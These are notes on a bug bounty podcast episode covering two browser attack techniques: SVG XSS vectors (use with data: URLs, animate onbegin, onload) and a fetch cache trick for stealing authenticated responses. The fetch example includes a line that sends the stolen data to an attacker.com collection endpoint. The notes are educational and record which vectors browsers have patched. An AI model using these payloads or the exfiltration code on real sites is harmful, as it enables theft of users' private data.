# EP22: Hardware Hacking Techniques for Bug Bounty - Client-Side Security Notes

## Metadata
- **Podcast:** Critical Thinking Bug Bounty Podcast
- **Episode:** 22
- **Hosts:** Justin (rhynorater) & Joel (teknogeek)
- **Primary Topic:** Hardware hacking (EMMC chip extraction, logic analyzers, IoT recon)
- **Client-Side Relevance:** Minimal -- two brief segments on browser/JS topics

> **NOTE:** This episode is overwhelmingly focused on hardware hacking (IoT chip extraction, UART, JTAG, soldering, EMMC readers). Client-side web security content is very limited. Only the relevant browser/JS segments are extracted below.

---

## Technique 1: SVG `<use>` Element Data URL XSS (Being Deprecated)

Discussion of Gareth Hayes' research on an XSS vector using data URLs inside the SVG `<use>` element, which Chrome 119 (November 2023) deprecated.

### How It Works

1. Attacker finds an injection point that allows SVG markup
2. Inside the SVG, the `<use>` element is used with a `data:` URL in its `href` attribute
3. The `data:` URL contains another SVG document with embedded JavaScript (e.g., via event handlers or `<script>` tags)
4. The browser processes the `data:` URL as same-origin content within the SVG context, executing the JavaScript

```html
<!-- Conceptual SVG XSS vector using <use> with data: URL -->
<!-- This vector is DEPRECATED as of Chrome 119 (Nov 2023) -->
<svg>
  <use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'>
    <image href='1' onerror='alert(1)' />
  </svg>#x">
  </use>
</svg>

<!-- Alternative SVG vectors that may still work (using <animate>): -->
<svg>
  <animate onbegin="alert(1)" attributeName="x" dur="1s">
  </animate>
</svg>

<!-- Standard SVG event handler vectors (unaffected by deprecation): -->
<svg onload="alert(1)">
<svg><image href=x onerror="alert(1)">
```

### Why This Works

- The `<use>` element in SVG is designed to reference and reuse other SVG content
- When it accepts a `data:` URL, the browser treats the inline SVG document as part of the same origin context
- This bypasses certain sanitization filters that may allow SVG elements but do not specifically block `data:` URLs within `<use>` `href` attributes
- Chrome deprecated this specifically because of the same-origin implications of data URLs in this context

### What Changed (Chrome 119+)

```
BEFORE Chrome 119:
  <svg> --> <use href="data:..."> --> Embedded SVG+JS executes --> XSS

AFTER Chrome 119:
  <svg> --> <use href="data:..."> --> BLOCKED (data URLs no longer
                                      processed in <use> element)
```

### Impact on Other Vectors

- `<svg onload>`, `<svg onerror>`, `<animate onbegin>` vectors are **NOT affected** by this deprecation
- Only the specific combination of `<use>` + `data:` URL is removed
- If external URLs are still allowed in `<use href>`, CSP policy becomes the gating factor:

```
Attacker-controlled SVG via <use>:

  If data: URL in <use>    --> BLOCKED (Chrome 119+)
  If external URL in <use> --> Blocked by CSP if script-src is restrictive
                           --> Possible if CSP allows the external domain
```

### Where To Apply This

- **Historical context only** -- this vector no longer works in modern Chrome
- When testing older browsers or Electron apps pinned to pre-119 Chromium, this vector may still fire
- When auditing SVG sanitization libraries, check if they strip `data:` URLs from `<use>` elements -- if they do not, older browser users remain vulnerable
- Reference: Gareth Hayes' research (PortSwigger), his book on JavaScript security
- PortSwigger Web Security Academy SVG-based XSS payloads remain a useful reference for vectors that still work

---

## Technique 2: Data Exfiltration via Fetch Cache Manipulation

Brief mention of a technique shared by researcher BitK at a live hacking event. This uses the browser's fetch API cache mode to exfiltrate data cross-origin.

### How It Works

1. Make an authenticated request that returns sensitive data (e.g., with the user's cookies)
2. The browser caches the response
3. Make a second fetch request to the same URL **without cookies** but with `cache: "force-cache"` (or `"only-if-cached"`)
4. The browser returns the cached response from step 1, which contains the authenticated data
5. Since the second request did not require cookies, this can be triggered from an attacker-controlled context

```javascript
// Step 1: Authenticated request (user's browser, with cookies)
// This happens naturally as the user browses the target site
// The response gets cached by the browser

// Step 2: Attacker's page triggers a fetch with forced caching
// (from an attacker-controlled origin, e.g., via XSS or iframed page)
fetch('https://target.com/api/sensitive-data', {
    cache: 'force-cache',  // Forces the browser to use cached response
    // No credentials sent -- but cache returns the authenticated response
    credentials: 'omit'
})
.then(response => response.text())
.then(data => {
    // data contains the authenticated response from the cache
    // Exfiltrate to attacker server:
    fetch('https://attacker.com/collect?data=' + encodeURIComponent(data));
});
```

### Why This Works

- The browser cache does not always partition cached responses by credential state
- A response cached WITH cookies can be retrieved WITHOUT cookies if the cache key matches
- `cache: "force-cache"` instructs the browser to prefer the cached version over making a new network request
- This effectively bypasses the same-origin policy for cached data

### Where To Apply This

- **Note from the podcast:** This technique was patched/deprecated shortly after becoming popular -- browsers have since implemented cache partitioning
- Modern browsers (Chrome 86+) implement **cache partitioning** (double-keyed cache) that prevents cross-site cache reads
- Still potentially relevant in:
  - Older browsers without cache partitioning
  - Same-site scenarios (subdomain attacker exfiltrating from another subdomain)
  - Electron apps or embedded WebViews with older Chromium

---

## Master Summary Table

| # | Technique | Type | Impact | Complexity | Status |
|---|-----------|------|--------|------------|--------|
| 1 | SVG `<use>` data URL XSS | DOM XSS | Script execution in victim context | Low (if injection exists) | **Deprecated** (Chrome 119, Nov 2023) |
| 2 | Fetch cache data exfiltration | Cache side-channel | Sensitive data leak | Medium | **Mostly patched** (cache partitioning) |

---

## Key Quotes

> "His favorite XSS vector is going to stop working... Chrome 119 November 2023. They're going to depreciate data URLs inside of the use element in SVGs." -- Justin, on Gareth Hayes' reaction

> "You could get a cookie to get the data and then it would cache the response. And then you could send the fetch request without the cookie with caching, pull from the cache set to mandatory. And then it would pull the results back." -- Justin, describing BitK's fetch cache technique

> "It's sad because those methods get deleted as soon as they become popular." -- Justin, on browser-based exploitation techniques having a short lifespan

> "If you can't find those [UART/JTAG], then you just do a chip pull and throw it into a reader and then try to pull the operating system off that way." -- Justin (hardware context, but illustrates the mindset of escalating from recon to extraction)

---

## Resources & References

- **Gareth Hayes** -- JavaScript/XSS researcher at PortSwigger; his book and Twitter are recommended for deep JS security knowledge
- **PortSwigger Web Security Academy** -- SVG-based XSS vectors including `<animate>` inside SVG
- **BitK** -- Researcher who shared the fetch cache exfiltration technique at a live hacking event
- **Chrome 119 deprecation** -- Removal of data URL support in SVG `<use>` elements
- **River Loop Security** -- Hardware hacking write-up referenced in the episode (linked in show notes)
- **John Hammond / Huntress** -- MOVEit vulnerability rapid response research referenced in the episode

---

## Episode Content Breakdown

- ~5% Client-side web security (SVG XSS deprecation, fetch cache trick)
- ~10% General bug bounty methodology (when to move on, rabbit holes, persistence)
- ~85% Hardware hacking (EMMC chip extraction, logic analyzers, BGA soldering, chip readers, RPMB, IoT recon)

This episode is not recommended as a primary resource for client-side web exploitation techniques. For hardware hacking methodology, it is excellent.
